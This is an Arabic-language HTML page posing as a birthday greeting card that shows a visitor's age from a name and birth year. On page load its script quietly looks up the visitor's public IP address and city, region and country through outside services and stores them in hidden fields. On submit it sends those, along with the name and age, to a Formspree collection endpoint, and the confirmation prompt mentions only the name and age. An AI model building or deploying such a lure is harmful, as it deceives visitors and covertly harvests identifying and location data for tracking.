<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بطاقة تهنئة عيد ميلاد 🎂</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
      padding: 20px;
    }
    .card {
      background: #ffffff;
      padding: 35px 25px;
      border-radius: 24px;
      box-shadow: 0 12px 35px rgba(0,0,0,0.15);
      text-align: center;
      width: 100%;
      max-width: 400px;
      border: 3px solid #ff6b81;
    }
    .icon { font-size: 50px; margin-bottom: 10px; }
    h2 { color: #ff4757; margin-bottom: 10px; font-size: 24px; }
    .greeting-text {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.6;
      background: #fff0f3;
      padding: 12px;
      border-radius: 12px;
    }
    .birthday-message {
      background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
      padding: 15px;
      border-radius: 12px;
      margin-bottom: 20px;
      font-size: 18px;
      font-weight: bold;
      color: #c0392b;
      display: none;
    }
    .birthday-message.show { display: block; animation: fadeIn 0.5s ease; }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-sizing: border-box;
      font-size: 16px;
      text-align: center;
      background-color: #fafafa;
    }
    input[type="number"] { -moz-appearance: textfield; }
    input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
    .btn-submit {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      margin-top: 5px;
    }
    .btn-submit:hover { transform: scale(1.02); box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4); }
    #status {
      font-size: 14px;
      margin: 15px 0 10px;
      color: #666;
      font-weight: 500;
      min-height: 25px;
    }
  </style>
</head>
<body>

<div class="card">
  <div class="icon">🎉</div>
  <h2>كل عام وأنت بخير!</h2>
  <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>

  <div id="birthdayMessage" class="birthday-message">
    🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
    <br>كل سنة وأنت طيب يا بطل 💪
  </div>

  <form id="birthdayForm">
    <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
    <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
    <div id="status"></div>

    <input type="hidden" id="ip" name="ip">
    <input type="hidden" id="location" name="location">
    <input type="hidden" id="age" name="age">

    <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
  </form>
</div>

<script>
  // ===== جلب IP والموقع (بدون GPS) =====
  async function fetchIPAndLocation() {
    try {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      const ip = ipData.ip;
      document.getElementById('ip').value = ip;

      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const geoData = await geoRes.json();
      const location = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
      document.getElementById('location').value = location;

    } catch (error) {
      console.log("تعذر جلب IP");
    }
  }

  // ===== حساب العمر =====
  function calculateAgeAndShow() {
    const name = document.getElementById('nameInput').value.trim();
    const year = parseInt(document.getElementById('yearInput').value);
    const currentYear = new Date().getFullYear();
    const messageDiv = document.getElementById('birthdayMessage');

    if (name && year && year >= 1900 && year <= currentYear) {
      const age = currentYear - year;
      if (age > 0 && age < 120) {
        document.getElementById('displayName').textContent = name;
        document.getElementById('displayAge').textContent = age;
        document.getElementById('age').value = age;
        messageDiv.classList.add('show');
        return;
      }
    }
    messageDiv.classList.remove('show');
  }

  // ===== إرسال البيانات =====
  function handleSubmit() {
    const name = document.getElementById('nameInput').value.trim();
    const year = document.getElementById('yearInput').value.trim();
    const status = document.getElementById('status');
    const age = document.getElementById('age').value;
    const ip = document.getElementById('ip').value;
    const location = document.getElementById('location').value;

    if (!name) {
      status.innerText = "⚠️ الرجاء إدخال اسمك!";
      status.style.color = "#ff4757";
      return;
    }

    if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
      status.innerText = "⚠️ الرجاء إدخال سنة ميلاد صحيحة!";
      status.style.color = "#ff4757";
      return;
    }

    if (!age || age < 1) {
      status.innerText = "⚠️ يرجى التأكد من سنة الميلاد!";
      status.style.color = "#ff4757";
      return;
    }

    if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) {
      return;
    }

    status.innerText = "⏳ جاري الإرسال...";
    status.style.color = "#333";

    const data = {
      name: name,
      age: age,
      birth_year: year,
      ip: ip || "غير متاح",
      location: location || "غير متاح"
    };

    fetch("https://formspree.io/f/xpqvvkdp", {
      method: "POST",
      body: JSON.stringify(data),
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    }).then(response => {
      if (response.ok) {
        status.innerText = "✅ تم إرسال التهنئة بنجاح! شكراً لك 🎊";
        status.style.color = "#2ed573";
        document.getElementById('birthdayForm').reset();
        document.getElementById('birthdayMessage').classList.remove('show');
      } else {
        status.innerText = "❌ حدث خطأ من الخادم، حاول مرة أخرى.";
        status.style.color = "#ff4757";
      }
    }).catch(error => {
      status.innerText = "❌ تعذر الاتصال بالخادم.";
      status.style.color = "#ff4757";
    });
  }

  // ===== تشغيل عند تحميل الصفحة =====
  window.onload = function() {
    fetchIPAndLocation();
    document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
    document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
  };
</script>

</body>
</html>
